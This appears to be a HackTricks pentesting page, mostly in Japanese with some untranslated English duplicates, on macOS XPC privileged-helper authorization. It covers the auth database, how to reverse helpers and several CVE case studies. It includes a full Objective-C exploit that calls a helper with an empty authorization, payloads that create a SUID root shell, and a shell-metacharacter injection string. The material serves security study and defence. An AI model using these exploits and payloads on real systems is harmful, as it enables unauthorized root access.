# macOS XPC 認可

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC 認可

Apple は、接続プロセスが **公開されている XPC メソッドを呼び出す権限を持っているか** によって認可する別の方法も提案しています。

アプリケーションが **特権ユーザとしてアクションを実行する必要がある** 場合、アプリ自体を特権ユーザで動かす代わりに、通常は root として HelperTool を XPC サービスとしてインストールし、アプリからそのサービスを呼び出して処理を行わせます。しかし、サービスを呼び出すアプリは十分な認可を持っている必要があります。

### ShouldAcceptNewConnection は常に YES

例として [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) が参照できます。`App/AppDelegate.m` では **`HelperTool` に接続しようと** しています。そして `HelperTool/HelperTool.m` の関数 **`shouldAcceptNewConnection`** は前述の要件を何も **チェックしません**。常に YES を返します:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
For more information about how to properly configure this check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### アプリケーションの権限

ただし、HelperTool のメソッドが呼び出されるときに、何らかの**認可処理が行われます**。

`App/AppDelegate.m` の関数 **`applicationDidFinishLaunching`** は、アプリ起動後に空の認可参照を作成します。これは常に動作するはずです。\
その後、`setupAuthorizationRights` を呼び出して、その認可参照に**いくつかの権利を追加しようとします**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` の `setupAuthorizationRights` 関数は auth database `/var/db/auth.db` にアプリケーションの権限を保存します。データベースにまだ存在しない権限のみを追加する点に注意してください:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
関数 `enumerateRightsUsingBlock` は、`commandInfo` に定義されているアプリケーションの権限を取得するために使用されるものです：
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will **require authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.

これは、この処理の最後に `commandInfo` 内で宣言された権限が `/var/db/auth.db` に保存されることを意味します。そこでは、**各メソッド**ごとに認証が必要なもの、**パーミッション名**、および **`kCommandKeyAuthRightDefault`** を確認できます。後者は**誰がその権利を取得できるか**を示します。

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

誰が権利にアクセスできるかを示すための異なるスコープがあります。そのうちのいくつかは [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) に定義されています (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/))。要約すると:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Anyone</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nobody</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Current user needs to be an admin (inside admin group)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ask user to authenticate.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ask user to authenticate. He needs to be an admin (inside admin group)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specify rules</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specify some extra comments on the right</td></tr></tbody></table>

<table><thead><tr><th width="284.3333333333333">名前</th><th width="165">値</th><th>説明</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>誰でも</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>誰も</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>現在のユーザーは管理者（adminグループのメンバー）である必要があります</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>ユーザーに認証を求める</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>ユーザーに認証を求めます。管理者（adminグループのメンバー）である必要があります</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>ルールを指定する</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>権利に関する追加のコメントを指定する</td></tr></tbody></table>

### Rights Verification

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:

`HelperTool/HelperTool.m` の関数 **`readLicenseKeyAuthorization`** は、呼び出し元がそのメソッドを実行する権限を持っているかを **`checkAuthorization`** 関数を呼び出して確認します。`checkAuthorization` は呼び出しプロセスが送った **authData** の**形式が正しいか**をチェックし、続いて特定メソッドを呼び出すために**何が必要か**を確認します。問題がなければ、**返される `error` は `nil` になります**：
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Note that to **権利を得る要件を確認する** to call that method the function `authorizationRightForCommand` will just check the previously comment object **`commandInfo`**. Then, it will call **`AuthorizationCopyRights`** to check **権利があるかどうか** to call the function (note that the flags allow interaction with the user).

In this case, to call the function `readLicenseKeyAuthorization` the `kCommandKeyAuthRightDefault` is defined to `@kAuthorizationRuleClassAllow`. So **誰でもこれを呼び出すことができます**.

### DB Information

It was mentioned that this information is stored in `/var/db/auth.db`. You can list all the stored rules with:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
その後、その権限に誰がアクセスできるかを次のように確認できます:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 許容的な権限

すべての権限構成は [**in here**](https://www.dssw.co.uk/reference/authorization-rights/) で確認できますが、ユーザーの操作を必要としない組み合わせは次のとおりです：

1. **'authenticate-user': 'false'**
- これは最も直接的なキーです。`false` に設定されている場合、この権利を得るためにユーザーが認証を行う必要がないことを指定します。
- これは **以下の2つのいずれかとの組み合わせ、またはユーザーが属するグループを示すもの** と組み合わせて使用されます。
2. **'allow-root': 'true'**
- ユーザーが rootユーザー（権限が昇格している）として動作している場合に、このキーが `true` に設定されていると、rootユーザーは追加の認証なしにこの権利を得られる可能性があります。ただし通常、rootユーザーになるには既に認証が必要であるため、ほとんどのユーザーにとってこれは「認証不要」のシナリオではありません。
3. **'session-owner': 'true'**
- `true` に設定されている場合、セッションの所有者（現在ログインしているユーザー）が自動的にこの権利を得ます。ユーザーが既にログインしている場合、追加の認証を回避する可能性があります。
4. **'shared': 'true'**
- このキーは認証なしに権利を付与するわけではありません。代わりに、`true` に設定されている場合、一度権利が認証されれば、各プロセスが再認証することなく複数のプロセス間で共有できることを意味します。ただし、最初の権利付与は `'authenticate-user': 'false'` のような他のキーと組み合わせない限り、依然として認証を必要とします。

興味深い権利を取得するには [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) を使用できます：
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### 認可バイパスのケーススタディ

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: 特権を持つ Mach サービス `com.acustica.HelperTool` はすべての接続を受け入れ、その `checkAuthorization:` ルーチンが `AuthorizationCopyRights(NULL, …)` を呼び出すため、任意の32‑byte blob が通過する。`executeCommand:authorization:withReply:` はその後、攻撃者制御下のカンマ区切り文字列を root として `NSTask` に渡し、次のようなペイロードを作成する:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
SUID root shell を簡単に作成できる。詳細は [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)。

- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: リスナーは常に YES を返し、同じ NULL `AuthorizationCopyRights` パターンが `checkAuthorization:` に現れる。`exchangeAppWithReply:` メソッドは攻撃者入力を `system()` 文字列に二度連結するため、`appPath` にシェルメタ文字（例: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`）を注入すると、Mach サービス `com.plugin-alliance.pa-installationhelper` を介して root でのコード実行が可能になる。詳細は [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)。
- **CVE-2024-4395 – Jamf Compliance Editor helper**: 監査を実行すると `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` が配置され、Mach サービス `com.jamf.complianceeditor.helper` が公開され、`-executeScriptAt:arguments:then:` が呼び出し元の `AuthorizationExternalForm` やコード署名を検証せずにエクスポートされる。簡単なエクスプロイトは空の参照を `AuthorizationCreate` で作成し、`[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` で接続して、そのメソッドを呼び出し任意のバイナリを root として実行する。詳細（リバースノートと PoC）は [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)。
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14、7.2.0–7.2.8、7.4.0–7.4.2 は、権限チェックのない特権ヘルパーに届く細工された XPC メッセージを受け入れていた。ヘルパーが自分自身の特権 `AuthorizationRef` を信用していたため、サービスにメッセージを送れる任意のローカルユーザがそれを強制して任意の設定変更やコマンドを root として実行させることができた。詳細は [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)。

#### Rapid triage tips

- アプリが GUI とヘルパーの両方を配布している場合、コード要件を比較し、`shouldAcceptNewConnection` が `-setCodeSigningRequirement:` でリスナーをロックしているか（あるいは `SecCodeCopySigningInformation` を検証しているか）を確認する。チェックが欠けていると、Jamf のケースのような CWE-863 の状況になりやすい。簡単な確認例は次のようになる：
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- ヘルパーが *認可している* と思っているものと、クライアントが渡すものを比較する。リバース時は `AuthorizationCopyRights` にブレークし、`AuthorizationRef` がヘルパー自身の特権コンテキストではなくクライアント提供の `AuthorizationCreateFromExternalForm` に由来することを確認する。そうでなければ、上記と類似した CWE-863 パターンを見つけている可能性が高い。

## 認可のリバース解析

### EvenBetterAuthorization が使用されているか確認

もし次の関数を見つけたら: **`[HelperTool checkAuthorization:command:]`** おそらくプロセスは前述の認可スキーマを使用している:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

さらに、この関数が `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree` といった関数を呼んでいるなら、[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) を使用している。

**`/var/db/auth.db`** をチェックして、ユーザ操作なしに特権アクションを呼び出す権限を得られるか確認する。

### プロトコル通信

次に、XPC サービスと通信を確立するためにプロトコルスキーマを見つける必要がある。

関数 **`shouldAcceptNewConnection`** はエクスポートされるプロトコルを示す:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

この場合、EvenBetterAuthorizationSample と同じである。[**この行を確認**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

使用されているプロトコル名が分かれば、そのヘッダ定義を**ダンプする**ことが可能である:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最後に、通信を確立するためには、**公開されている Mach Service の名前**を知る必要があります。これを見つける方法はいくつかあります：

- **`[HelperTool init]`** 内で Mach Service が使用されているのが確認できます:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist の中で:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit の例

この例では以下が作成されます:

- 関数を含むプロトコルの定義
- アクセスを要求するために使用する空の auth
- XPC サービスへの接続
- 接続が成功した場合の関数呼び出し
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 悪用されたその他の XPC 特権ヘルパー

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 参考資料

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
